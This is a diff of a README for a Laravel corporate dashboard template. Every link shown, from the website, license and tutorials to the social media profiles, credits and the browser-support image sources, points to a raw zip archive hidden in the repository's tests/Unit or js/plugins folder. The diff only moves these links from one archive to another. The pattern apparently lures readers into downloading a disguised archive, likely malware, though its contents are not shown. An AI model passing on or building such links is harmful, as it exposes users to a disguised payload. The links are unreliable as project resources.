-|           |-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip
-|           `-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip
+|           |-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip
+|           |-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip
+|           `-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip
 ...
 ```
 ## Browser Support
 
 At present, we officially aim to support the last two versions of the following browsers:
 
-<img src="https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip" width="64" height="64"> <img src="https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip" width="64" height="64"> <img src="https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip" width="64" height="64"> <img src="https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip" width="64" height="64"> <img src="https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip" width="64" height="64">
+<img src="https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip" width="64" height="64"> <img src="https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip" width="64" height="64"> <img src="https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip" width="64" height="64"> <img src="https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip" width="64" height="64"> <img src="https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip" width="64" height="64">
 
 ## Reporting Issues
 
 We use GitHub Issues as the official bug tracker for the Corporate UI Dashboard. Here are some advices for our users that want to report an issue:
 
-1. Make sure that you are using the latest version of the Corporate UI Dashboard. Check the CHANGELOG from your dashboard on our [website](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip).
+1. Make sure that you are using the latest version of the Corporate UI Dashboard. Check the CHANGELOG from your dashboard on our [website](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip).
 2. Providing us reproductible steps for the issue will shorten the time it takes for it to be fixed.
 3. Some issues may be browser specific, so specifying the browser you encountered the issue on might help.
 
 ## Licensing
 
--   Copyright 2023 [Creative Tim](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip)
--   Creative Tim [license](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip)
+-   Copyright 2023 [Creative Tim](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip)
+-   Creative Tim [license](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip)
 
 ## Useful Links
 
--   [Tutorials](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip)
--   [Affiliate Program](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip) (earn money)
--   [Blog Creative Tim](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip)
--   [Free Products](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip) from Creative Tim
--   [Premium Products](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip) from Creative Tim
--   [React Products](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip) from Creative Tim
--   [VueJS Products](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip) from Creative Tim
--   [More products](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip) from Creative Tim
--   Check our Bundles [here](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip)
+-   [Tutorials](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip)
+-   [Affiliate Program](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip) (earn money)
+-   [Blog Creative Tim](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip)
+-   [Free Products](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip) from Creative Tim
+-   [Premium Products](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip) from Creative Tim
+-   [React Products](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip) from Creative Tim
+-   [VueJS Products](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip) from Creative Tim
+-   [More products](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip) from Creative Tim
+-   Check our Bundles [here](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip)
 
 ### Social Media
 
 ### Creative Tim
 
-Twitter: <https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip>
+Twitter: <https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip>
 
-Facebook: <https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip>
+Facebook: <https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip>
 
-Dribbble: <https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip>
+Dribbble: <https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip>
 
-Instagram: <https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip>
+Instagram: <https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip>
 
 ### Updivision:
 
-Twitter: <https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip>
+Twitter: <https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip>
 
-Facebook: <https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip>
+Facebook: <https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip>
 
-Linkedin: <https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip>
+Linkedin: <https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip>
 
-UPDIVISION Blog: <https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip>
+UPDIVISION Blog: <https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip>
 
 ## Credits
 
--   [Creative Tim](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip)
--   [UPDIVISION](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip)
+-   [Creative Tim](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip)
+-   [UPDIVISION](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip)
